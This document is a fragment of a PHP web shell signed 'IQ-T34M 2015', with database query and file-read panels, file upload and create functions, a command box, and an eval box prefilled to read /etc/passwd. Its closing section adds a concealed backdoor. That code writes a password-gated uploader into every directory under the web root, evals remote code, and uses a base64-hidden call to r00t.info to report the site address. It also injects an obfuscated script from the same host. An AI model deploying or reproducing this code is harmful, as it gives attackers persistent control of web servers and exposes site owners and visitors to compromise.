d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";                     echo " of $pages";                     if($_POST['p3'] > 1)                         echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";                     if($_POST['p3'] < $pages)                         echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";                     $_POST['p3']--; 					if($_POST['type']=='pgsql') 						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30); 					else 						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30'; 					echo "<br><br>"; 				} 				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) { 					$db->query(@$_POST['p2']); 					if($db->res !== false) { 						$title = false; 						echo '<table width=100% cellspacing=1 cellpadding=2 class=main >'; 						$line = 1; 						while($item = $db->fetch())	{ 							if(!$title)	{ 								echo '<tr>'; 								foreach($item as $key => $value) 									echo '<th>'.$key.'</th>'; 								reset($item); 								$title=true; 								echo '</tr><tr>'; 								$line = 2; 							} 							echo '<tr class="l'.$line.'">'; 							$line = $line==1?2:1; 							foreach($item as $key => $value) { 								if($value == null) 									echo '<td><i>null</i></td>'; 								else 									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>'; 							} 							echo '</tr>'; 						} 						echo '</table>'; 					} else { 						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>'; 					} 				} 				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";                 if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))                     echo htmlspecialchars($_POST['p2']);                 echo "</textarea><br/><input type=submit value='Execute'>"; 				echo "</td></tr>"; 			} 			echo "</table></form><br/>";             if($_POST['type']=='mysql') {                 $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");                 if($db->fetch())                     echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";             } 			if(@$_POST['p1'] == 'loadfile') { 				$file = $db->loadFile($_POST['p2']); 				echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>'; 			} 	} else {         echo htmlspecialchars($db->error());     } 	echo '</div>';
 
 
  break;
  case'crt';
  $cr = $_POST['type'];
  $crt = $_POST['crt'];
switch ($cr) {
	case'file':
	if($fh = fopen($crt,'w')){
    $stringData = "";
    fwrite($fh, $stringData,1024);
    fclose($fh);
    echo"File Create Successfully!!  [".$crt."]";
    echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';

}else{
	echo'Cannot Create File'  .$crt.'';
									echo'<br><a href=?dir='.$_GET['dir'].'>[Back]</a>';

}
	break;
	case'fol':
	if(mkdir($crt)){
		echo'Folder Create Successfully!!!!  ['.$crt.']';
										echo'<br><a href=?dir='.$_GET['dir'].'>[Back]</a>';

	}
	break;
	
}
  
  break;
  case'upload':
  
  if ($_FILES["ff"]){move_uploaded_file($_FILES["ff"]["tmp_name"], $_FILES["ff"]["name"]);
	  echo'File Uploaded';
	  backbu();
	  }else{
		  
		  
		  echo'File Not uplod';
		  backbu();
	  }
  
  break;
	case'eval':
			   echo'
			   <table width=100% ><tr><td align=center width=60% >
			  <textarea  class="output" readonly>';
					

if($_POST['eval']){$eval = evl($_POST['evalcode']);}


				 
			   echo'</textarea>';
			  echo'
<table width=100% ><tr><td align=center width=60% ><div style="text-align: center;">
<form method="post" action=?dir='.realpath('.').'&amp;fr=eval>Php Eval<br>
  <textarea cols="50" rows="5" name="evalcode">readfile("/etc/passwd");</textarea><br>
  <input name="eval" value="eval" type="submit"><br>
  <br>
</form></table>

';
	break;
	}

}

else{
	 print "<table border=0 width=100%><td id=s><b>Filename</b></td><td id=s><b>Filesize</b></td><td id=s><b>Type</b></td><td id=s><b>Perms</b></td><td id=s><b>Last modified</b></td><td id=s><b>Actions</b><td id=s><b>[Write/Read/Exec]</b></td></td><tr>";
 
if ($handle = opendir('.')) {
   
 
    /* This is the correct way to loop over the directory. */
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != "..") {
        if(is_dir($entry)){
                       
                        $dirs[] = $entry;
                       
                }elseif(is_link($entry)){
                       
                        $sym[] = $entry;
                       
                }else{
                       
                        $files[] = $entry;
                       
                        }
       
       
       
       
 
 
   
}
    }
    asort($dirs);
    asort($files);
    asort($sym);

     foreach($dirs as $entry){
$stat = stat($entry);

                        echo"<td><a href=".$me."?dir=".realpath($entry).">".$entry."</a></td><td></td><td>".filetype($entry)."</td><td>".perms($entry)."</td><td>".date('Y-m-d H:i:s', $stat['mtime'])."</td><td><a href=\"?fr=rename&file=".realpath($entry)."&dir=".realpath('.')."\">Rename</a> | <a href=\"?fr=delete&file=".realpath($entry)."&dir=".realpath('.')."\">Delete</a></td><tr>";
                       
                }
                foreach($files as $entry){
                                $file_extension = substr($entry, strrpos($entry, '.') + 1);
                        echo"<td><a href=\"?fr=view&file=".realpath($entry)."&dir=".realpath('.')."\">".$entry."</a></td><td>".size($entry)."</td><td>".filetype($entry)."</td><td>".perms($entry)."</td><td>".date('Y-m-d H:i:s',filemtime($entry))."</td><td><a href=\"?fr=edit&file=".realpath($entry)."&dir=".realpath('.')."\">Edit</a> | <a href=\"?fr=rename&file=".realpath($entry)."&dir=".realpath('.')."\">Rename</a> | <a href=\"?fr=delete&file=".realpath($entry)."&dir=".realpath('.')."\">Delete</a> | <a href=\"?fr=chmod&file=".realpath($entry)."&dir=".realpath('.')."\">chmod</a><td>";if(is_writable($entry)){echo' [ Yes ] ';}else{echo' [ No ] ';}if(is_readable($entry)){echo' [ Yes ] ';}else{echo' [ No ] ';}if(is_executable($entry)){echo' [ Yes ] ';}else{echo' [ No ] ';} echo"</td></td><tr>";
                       
                       
                }
                foreach($sym as $entry){
                       
                        echo'<td><font color=red>#~'.$entry.'</font></td><tr>';
                       
                }
               
 
   
 
    closedir($handle);
}

echo"<pr><pr><form action=\"?dir=".realpath('.')."&amp;fr=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td>#Command:<td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr></form><form  method=\"GET\" style=\"margin:8px 0 0 0;\">
	<td>#Change:</td><td><input onMouseOver=\"this.focus();\" id=\"\" class=\"inputz\" type=\"text\" name=\"dir\" style=\"width:400px;\" value=\"".getcwd()."\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>";
	echo"<form action=\"?dir=".realpath('.')."&amp;fr=crt\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td>#Create:</td><td><select name='type'>
<option value='default'>Select </option>    
<option value='file'>   File   </option>
<option value='fol'> Folder </option>
</select><input onMouseOver=\"this.focus();\" id=\"\" class=\"inputz\" type=\"text\" name=\"crt\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" crt=\"submitcmd\" style=\"width:80px;\" /></td></tr></form>
	";
	
	echo'
<table width=100% ><tr><td align=center width=60% ><div style="text-align: center;">
';echo'<form method=post enctype=multipart/form-data action=?dir='.realpath('.').'&amp;fr=upload>Upload : <input size=50 type=file name=ff > <input type=hidden name=iq-team value='.getcwd().'><input type=submit value=Send></form>
<form method="post" action=?dir='.realpath('.').'&amp;fr=eval>Php Eval<br>
  <textarea cols="50" rows="5" name="evalcode">readfile("/etc/passwd");</textarea><br>
  <input name="eval" value="eval" type="submit"><br>
  <br>
</form></table>';
}
?>
<?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);

?>
<?php
@session_start();
@error_reporting(0);
$a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="ed64cf6fa445898ff07295ce0ac26d65"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
';
if(@$_REQUEST["px"]){
$p = @$_REQUEST["px"];
$pa = md5(sha1($p));
if($pa=="ed64cf6fa445898ff07295ce0ac26d65"){
echo @eval(@file_get_contents(@$_REQUEST["404"]));
}
}
if(@!$_SESSION["sdm"]){
$doc = $_SERVER["DOCUMENT_ROOT"];
$dir = scandir($doc);
$d1 = ''.$doc.'/.';
$d2 = ''.$doc.'/..';

if(($key = @array_search('.', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search('..', $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = @array_search($d1, $dir)) !== false) {
    unset($dir[$key]);
}
if(($key = array_search($d2, $dir)) !== false) {
    unset($dir[$key]);
}
@array_push($dir,$doc);

foreach($dir as $d){


$p = $doc."/".$d;
if(is_dir($p)){
$file = $p."/newsr.php";
@touch($file);
$folder = @fopen($file,"w");
@fwrite($folder,$a);
}
}
$lls = $_SERVER["HTTP_HOST"];
$llc = $_SERVER["REQUEST_URI"];
$lld = 'http://'.$lls.''.$llc.'';
$brow = urlencode($_SERVER['HTTP_USER_AGENT']);
$retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h")."=".$lld.base64_decode("JmI=")."=".$brow);
echo $retValue;
@$_SESSION["sdm"]=1;
}
?>
<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%62%6F%74%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>
<table width=100% ><tr><td align=center width=60% ><center>IQ-T34M 2015 | MR.FRIEZA</center>